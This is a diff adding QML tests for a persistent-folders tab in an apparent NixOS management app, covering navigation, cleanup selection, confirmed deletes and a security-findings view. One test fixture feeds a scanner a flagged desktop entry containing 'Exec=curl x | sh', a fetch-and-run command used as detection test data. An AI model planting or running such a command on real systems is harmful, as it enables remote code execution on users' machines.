@@ -52,6 +52,138 @@ Item {
     TestCase {
         name: "SharedView"
         when: windowShown
+        function test_persistent_folders_tab_appears_only_when_detected() {
+            core.impermanence = core.emptyImpermanence;
+            const navigation = findChild(app, "tab-impermanence");
+            verify(!navigation.visible);
+            verify(!app.tools.some(t => t.key === "impermanence"));
+            core.impermanence = core.parseImpermanence("volatile\tyes\ttmpfs\npersist\t/persist\tbind\t2\text4\t1000\t500\t500\n");
+            verify(navigation.visible);
+            verify(!app.tools.some(t => t.key === "impermanence"));
+            wait(50);
+            mouseClick(navigation);
+            compare(core.activeViewMode, "impermanence");
+            verify(navigation.selected);
+            verify(!app.inTools);
+            compare(app.activeTool, null);
+            verify(!findChild(app, "toolsOverlay").visible);
+            const content = findChild(app, "impermanenceTab");
+            verify(content.visible);
+            compare(content.parent.objectName, "viewBody");
+        }
+        function test_persistent_folders_tab_shows_folders_findings_and_confirms_deletes() {
+            core.impermanence = core.parseImpermanence("volatile\tyes\ttmpfs\npersist\t/persist\tbind\t1\text4\t1000\t500\t500\nentry\td\t/home/u/.ssh\t/persist/home/u/.ssh\n");
+            core.impermanenceListing = core.parseImpermanenceListing("D\t/persist/home/u\t/persist\t5000\t12\t1700000000\n" + "C\td\t4000\t10\t1700000000\t1700000000\t755\tu\th\t\t.cache\n" + "C\td\t1000\t2\t1700000000\t1700000000\t700\tu\th\t\t.ssh\n");
+            core.activeViewMode = "impermanence";
+            wait(50);
+            const tab = findChild(app, "impermanenceTab");
+            verify(tab.visible);
+            compare(tab.shownItems.length, 2);
+            // Kept folders › /persist › home › u
+            compare(tab.crumbs.length, 4);
+            compare(tab.crumbs[0].path, "");
+            // Entries bound by the configuration cannot be deleted from here.
+            verify(tab.isBound(tab.shownItems[1]));
+            verify(!tab.isBound(tab.shownItems[0]));
+            // Filters say what they mean: executables and permissions are separate.
+            tab.filter = "perms";
+            compare(tab.shownItems.length, 0);
+            tab.filter = "hidden";
+            compare(tab.shownItems.length, 2);
+            tab.filter = "all";
+            // Rows remain visible until the helper confirms deletion.
+            tab.setLens("folders");
+            tab.toggleSelected(tab.shownItems[0], "item");
+            compare(tab.selectedCount, 1);
+            verify(findChild(app, "impermanenceSelectionBar").visible);
+            tab.reviewing = true;
+            tab.deleteSelected();
+            compare(tab.selectedCount, 0);
+            compare(tab.shownItems.length, 2);
+            compare(tab.removalFor(tab.shownItems[0].path).state, "deleting");
+            tab.pendingPath = tab.shownItems[1].path;
+            wait(20);
+            tab.setLens("security");
+            compare(tab.pendingPath, "");
+            core.impermanenceScan = core.parseImpermanenceScan("high\tSuspicious command\t/persist/a.desktop\tExec=curl x | sh\n" + "low\tRuns automatically\t/persist/b\tnote\n");
+            compare(tab.findings.length, 2);
+            compare(tab.countOf("low"), 1);
+            compare(tab.attentionCount, 1);
+            tab.setLens("folders");
+        }
+        function test_folder_navigation_goes_back_to_the_kept_list() {
+            core.impermanence = core.parseImpermanence("volatile\tyes\ttmpfs\npersist\t/persist\tbind\t1\text4\t1000\t500\t500\nentry\td\t/home/u/.config/Code\t/persist/home/u/.config/Code\n");
+            core.activeViewMode = "impermanence";
+            wait(20);
+            const tab = findChild(app, "impermanenceTab");
+            commandSpy.clear();
+            tab.openFolder("/persist/home/u/.config/Code", "VS Code settings");
+            compare(tab.lens, "folders");
+            compare(tab.openDir, "/persist/home/u/.config/Code");
+            core.impermanenceListing = core.parseImpermanenceListing("D\t/persist/home/u/.config/Code/User\t/persist\t10\t1\t1700000000\n");
+            tab.enter("/persist/home/u/.config/Code/User");
+            compare(tab.crumbs.length, 3);
+            compare(tab.crumbs[1].label, "VS Code settings");
+            compare(tab.crumbs[2].label, "User");
+            tab.goBack();
+            compare(tab.openDir, "/persist/home/u/.config/Code");
+            tab.goBack();
+            compare(tab.openDir, "");
+        }
+        function test_cleanup_is_picked_reviewed_and_deleted_together() {
+            core.impermanence = core.parseImpermanence("volatile\tyes\ttmpfs\npersist\t/persist\tbind\t1\text4\t1000\t500\t500\n");
+            core.impermanenceCleanup = core.parseImpermanenceCleanup("M\t1000\t180\nT\tApplication cache\t900\t5\t/persist/home/u/.cache/x\nT\tTrash\t100\t5\t/persist/home/u/.local/share/Trash\n" + "S\td\t500\t3\t10\t/persist/home/u/old\n", 180);
+            core.activeViewMode = "impermanence";
+            wait(20);
+            const tab = findChild(app, "impermanenceTab");
+            tab.setLens("cleanup");
+            compare(tab.tidy("/persist/home/u/old"), "~/old");
+            const bar = findChild(app, "impermanenceSelectionBar");
+            verify(!bar.visible);
+            tab.selectAll(tab.tempItems, "cache");
+            tab.toggleSelected(tab.staleItems[0], "personal");
+            compare(tab.selectedCount, 3);
+            compare(tab.selectedBytes, 1500);
+            verify(bar.visible);
+            tab.toggleSelected(tab.tempItems[1], "cache");
+            compare(tab.selectedCount, 2);
+            tab.reviewing = true;
+            let asked = null;
+            const take = items => asked = items;
+            tab.removeManyRequested.connect(take);
+            tab.deleteSelected();
+            tab.removeManyRequested.disconnect(take);
+            compare(asked.length, 2);
+            compare(tab.selectedCount, 0);
+            verify(!tab.reviewing);
+            tab.setLens("folders");
+        }
+        function test_persisted_list_names_sizes_filters_and_dedupes_disks() {
+            core.impermanence = core.parseImpermanence("volatile\tyes\ttmpfs\npersist\t/persist\tbind\t3\tbtrfs\t1000\t500\t500\nmount\t/home\tbtrfs\t1000\t500\t500\n" + "entry\td\t/home/u/.config/Code\t/persist/home/u/.config/Code\nentry\td\t/home/u/.ssh\t/persist/home/u/.ssh\nentry\td\t/var/lib/bluetooth\t/persist/var/lib/bluetooth\n");
+            core.impermanenceSizes = core.parseImpermanenceSizes("E\td\t5000\t1700000000\t/home/u/.config/Code\t/persist/home/u/.config/Code\n" + "E\td\t90\t1700000000\t/home/u/.ssh\t/persist/home/u/.ssh\nE\td\t700\t1700000000\t/var/lib/bluetooth\t/persist/var/lib/bluetooth\n");
+            core.activeViewMode = "impermanence";
+            wait(50);
+            const tab = findChild(app, "impermanenceTab");
+            tab.closeFolder();
+            tab.lens = "folders";
+            // Two places on one filesystem share a single disk bar.
+            compare(tab.disks.length, 1);
+            compare(tab.disks[0].paths.length, 2);
+            compare(tab.persistedRows.length, 3);
+            compare(tab.filteredRows[0].title, "VS Code settings");
+            compare(tab.filteredRows[0].shown, "~/.config/Code");
+            compare(tab.filteredRows[2].title, "SSH keys and hosts");
+            tab.scope = "system";
+            compare(tab.filteredRows.length, 1);
+            compare(tab.filteredRows[0].title, "Bluetooth pairings");
+            tab.scope = "all";
+            tab.search = "ssh";
+            compare(tab.filteredRows.length, 1);
+            tab.search = "";
+            tab.sortBy = "name";
+            compare(tab.filteredRows[0].shown, "/var/lib/bluetooth");
+            tab.sortBy = "size";
+        }
         function test_non_nixos_tools() {
             core.isNixOS = false;
             core.activeViewMode = "tools";
